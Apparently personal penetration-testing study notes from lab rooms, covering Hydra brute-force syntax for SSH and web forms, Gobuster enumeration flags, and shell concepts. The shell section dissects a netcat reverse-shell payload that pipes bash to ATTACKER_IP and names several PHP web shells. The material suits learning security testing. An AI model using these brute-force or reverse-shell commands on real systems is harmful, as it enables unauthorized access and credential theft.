
# Hydra — Brute Force Tool

Hydra is an online password cracking tool that brute forces login credentials across multiple protocols.

---

## SSH Brute Force
```bash
hydra -l <username> -P <wordlist_path> <ip> -t 4 ssh
```

| Option | Description |
|--------|-------------|
| `-l` | Single username for login |
| `-P` | Path to password wordlist |
| `-t` | Number of parallel threads |

**Example:**
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.129.142.238 -t 4 ssh
```

---

## Web Form Brute Force (HTTP POST)
```bash
sudo hydra -l <username> -P <wordlist> <ip> http-post-form "<path>:<login_credentials>:<invalid_response>"
```

| Option | Description |
|--------|-------------|
| `-l` | Username for web form login |
| `-P` | Password wordlist |
| `http-post-form` | Tells Hydra the form uses POST method |
| `<path>` | Login page URL e.g. `/login.php` |
| `<login_credentials>` | Form fields e.g. `username=^USER^&password=^PASS^` |
| `<invalid_response>` | Text that appears on screen when login fails |
| `-V` | Verbose — shows every attempt |

**Example:**
```bash
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.142.238 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

---

## How it works
- `^USER^` and `^PASS^` are placeholders — Hydra substitutes the actual username and password from your wordlist on each attempt
- The invalid response string tells Hydra what a **failed** login looks like so it knows when it's found the right password
- Lower `-t` value for SSH to avoid account lockouts or crashing the service

---

> ⚠️ Only use on systems you have permission to test
Enumeration

Enumeration is the act of listing all the available resources, whether they are accessible or not. For example, Gobuster enumerates web directories.

Brute Force

Brute force is the act of trying every possibility until a match is found. It is like having ten keys and trying them all on a lock until one fits. Gobuster uses wordlists for this purpose.
Usage: Shows the syntax on how to use the command.
Available Commands: Multiple commands are available to aid us in enumerating directories, files, DNS subdomains, Google Cloud Storage buckets, and Amazon AWS S3 buckets. Throughout this room, we will focus on the dir, dns, and vhost commands. We will cover each of them in the following tasks.
Flags: These are specific options we can configure to customize our commands. Let’s look at the flags we will often use throughout this room:
Short Flag	Long Flag	Description
-t	--threads	This flag configures the number of threads to use for the scan. Each of these threads sends out requests with a slight delay. The default number of threads is 10. This number may be slow when using large wordlists. You can increase or decrease the number of threads depending on the available system resources.
-w	--wordlist	The flag configures a wordlist to use for iterating. Each wordlist entry is attached to the URL you included in the command.
--delay	This flag defines the amount of time to wait between sending requests. Some web servers include mechanisms to detect enumeration by looking at how many requests are received in a certain period of time. We can increase the delay between subsequent requests to make it look like normal web traffic.
--debug	This flag helps us to troubleshoot when our command gives unexpected errors.
-o	--output	This flag writes the enumeration results to a file we choose.
any flags are used to fine-tune the gobuster dir command. It is out of scope to go over each one of them, but in the table below, we have listed the flags that cover most of the scenarios:

Flag	Long Flag	Description
-c	--cookies	This flag configures a cookie to pass along each request, such as a session ID.
-x	--extensions	This flag specifies which file extensions you want to scan for. E.g., .php, .js
-H	--headers	This flag configures an entire header to pass along with each request.
-k	--no-tls-validation	This flag  skips the process that checks the certificate when https is used. It often happens for CTF events or test rooms like the ones on THM a self-signed certificate is used. This causes an error during the TLS check.
-n	--no-status	You can set this flag when you don’t want to see status codes of each response received. This helps keep the output on the screen clear.
-P	password	You can set this flag together with the --username flag to execute authenticated requests. This is handy when you have obtained credentials from a user.
-s	--status-codes	With this flag, you can configure which status codes of the received responses you want to display, such as 200, or a range like 300-400.
-b	--status-codes-blacklist	This flag allows you to configure which status codes of the received responses you don’t want to display. Configuring this flag overrides the -s flag.
-U	--username	You can set this flag together with the --password flag to execute authenticated requests. This is handy when you have obtained credentials from a user.
-r	--followredirect	This flags configures Gobuster to follow the redirect that it received as a response to the sent request. A HTTP redirect status code (e.g., 301 or 302) is used to redirect the client to a different URL.
The dns mode offers fewer flags than the dir mode. But these are more than enough to cover most DNS subdomain enumeration scenarios. Let us have a look at some of the commonly used flags:

Flag	Long Flag	Description
-c

--show-cname

Show CNAME Records (cannot be used with the -i flag).

-i

--show-ips

Including this flag shows IP addresses that the domain and subdomains resolve to.
-r

--resolver

This flag configures a custom DNS server to use for resolving.
-d

--domain

This flag configures the domain you want to enumerate.
 vhost mode. This mode allows Gobuster to brute force virtual hosts. Virtual hosts are different websites on the same machine.
  vhost mode offers flags similar to those of the dir mode. Let us have a look at some of the commonly used flags:

Short Flag	Long Flag	Description
-u

--url

Specifies the base URL (target domain) for brute-forcing virtual hostnames.

--append-domain

Appends the base domain to each word in the wordlist (e.g., word.example.com).
-m

--method

Specifies the HTTP method to use for the requests (e.g., GET, POST).

--domain

Appends a domain to each wordlist entry to form a valid hostname (useful if not provided explicitly).

--exclude-length

Excludes results based on the length of the response body (useful to filter out unwanted responses).
-r

--follow-redirect

Follows HTTP redirects (useful for cases where subdomains may redirect).
 # Shell overview
 A shell is software that allows a user to interact with an OS. It can be a graphical interface, but it is usually a command-line interface, and this will depend on the operating system running on the target system.
Remote System Control: allows the attacker to execute commands or software remotely in the target system.
Privilege Escalation: If initial access through a shell is limited or restricted, attackers can explore ways to escalate privileges to more elevated or administrative access.
Data Exfiltration: Once attackers have access to execute commands through an obtained shell, they can explore the system to read and copy sensitive data from it.
Persistence and Maintenance Access: Once shell access is obtained, attackers can create access through users and credentials or copy backdoor software to maintain access to the target system for later usage.
Post-Exploitation Activities: After access to a shell is granted, attackers can perform a wide range of post-exploitation activities, such as deploying malware, creating hidden accounts, and deleting information.
Access Other Systems on the Network: Depending on the attacker's intentions, the obtained shell can be just an initial access point. The goal can be to hop through the network to a different target using the obtained shell as a pivot to different points in the compromised system network. This is also known as pivoting.
A reverse shell, sometimes referred to as a "connect back shell," is one of the most popular techniques for gaining access to a system in cyberattacks. The connections initiate from the target system to the attacker's machine, which can help avoid detection from network firewalls and other security appliances.

 command above uses the -l option to indicate Netcat to listen or wait for a connection. The -v option enables verbose mode. The -n option prevents the connections from using DNS for lookup, so it will not resolve any hostname it will use an IP address. Finally, the -p flag indicates the port that will be used to wait for the connection
 Any port can be used to wait for a connection, but attackers and pentesters tend to use known ports used by other applications like 53, 80, 8080, 443, 139, or 445. This is to blend the reverse shell with legitimate traffic and avoid detection by security appliances.

Explanation of the Payload

rm -f /tmp/f - This command removes any existing named pipe file located at /tmp/f/. This ensures that the script can create a new named pipe without conflicts.
mkfifo /tmp/f - This command creates a named pipe, or FIFO (first-in, first-out), at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
cat /tmp/f - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
| bash -i 2>&1 - The output of cat is piped to a shell instance (bash -i), which allows the attacker to execute commands interactively. The 2>&1 redirects standard error to standard output, ensuring that error messages are sent back to the attacker.
| nc ATTACKER_IP ATTACKER_PORT >/tmp/f - This part pipes the shell's output through nc (Netcat) to the attacker's IP address (ATTACKER_IP) on the attacker's port (ATTACKER_PORT).
>/tmp/f -This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.
>Bind Shell
As the name indicates, a bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely.

Rlwrap

It is a small utility that uses the GNU readline library to provide editing keyboard and history.

Socat
It is a utility that allows you to create a socket connection between two data sources, in this case, two different hosts.
A web shell is a script written in a language supported by a compromised web server that executes commands through the web server itself. A web shell is usually a file containing the code that executes commands and handles files. It can be hidden within a compromised web application or service, making it difficult to detect and very popular among attackers.
p0wny-shell - A minimalistic single-file PHP web shell that allows remote command execution.
b374k shell - A more feature-rich PHP web shell with file management and command execution, among other functionalities.
c99 shell - A well-known and robust PHP web shell with extensive functionality
